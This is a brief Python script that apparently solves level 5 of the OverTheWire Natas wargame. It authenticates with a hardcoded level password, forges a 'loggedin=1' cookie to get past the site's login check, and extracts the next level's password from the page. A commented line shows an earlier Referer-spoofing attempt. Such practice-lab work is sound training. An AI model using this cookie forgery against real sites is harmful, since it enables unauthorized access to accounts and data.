#!/user/bin/env python
import requests
import  re
username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'
cookies = {"loggedin" : "1"}
#headers={"Referer" : "subscribelolz"}
#headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

url ='http://%s.natas.labs.overthewire.org' % username
session = requests.Session()
#print(session)
#reponse = requests.get(url, auth=(username, password))
reponse = session.get(url, auth=(username, password),cookies=cookies)
content = reponse.text
#print(session.cookies['loggedin'])
print (content)
print (re.findall('The password for natas6 is (.*)',content)[0])
